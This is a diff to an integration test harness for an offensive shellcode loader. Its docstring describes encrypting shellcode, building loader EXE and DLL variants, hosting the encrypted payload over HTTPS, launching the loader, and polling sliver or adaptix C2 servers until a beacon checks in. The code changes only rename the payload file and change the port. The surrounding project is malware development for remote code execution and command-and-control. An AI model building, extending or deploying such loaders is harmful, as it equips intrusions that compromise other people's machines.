@@ -5,7 +5,7 @@ End-to-end loader integration test.
 For each (shellcode, build_config) pair:
   1. Encrypt shellcode with Encrypt.py (--url points at our HTTPS host)
   2. Build loader with build.bat (variant flag)
-  3. Host data.enc as /payload.dat on localhost:9443
+  3. Host the encrypted payload (URL basename, e.g. payload.dat) on localhost:18443
   4. Launch the built loader (EXE) or load it (DLL)
   5. Poll the C2 (sliver/adaptix) until a beacon checks in OR timeout
   6. Record result, kill loader process, kill host server
@@ -214,12 +214,13 @@ def run_one_test(c2: str, shellcode: Path, variant: str, port: int = 18443,
 
     url = f"https://127.0.0.1:{port}/payload.dat"
     artifact = encrypt_and_build(shellcode, variant, url, rwx=(c2 == "sliver"))
-    enc_path = ROOT / "data.enc"
+    # Encrypt.py derives output filename from URL — for this URL the file is payload.dat
+    enc_path = ROOT / "payload.dat"
     if not enc_path.exists():
-        return {"label": label, "ok": False, "error": "data.enc missing after build"}
+        return {"label": label, "ok": False, "error": "payload.dat missing after build"}
 
-    # Persist the per-variant data.enc
-    per_variant_enc = TESTDIR / "payloads" / f"{label}-data.enc"
+    # Persist the per-variant encrypted blob
+    per_variant_enc = TESTDIR / "payloads" / f"{label}-payload.dat"
     shutil.copy2(enc_path, per_variant_enc)
 
     workdir = TESTDIR / "runtime" / label
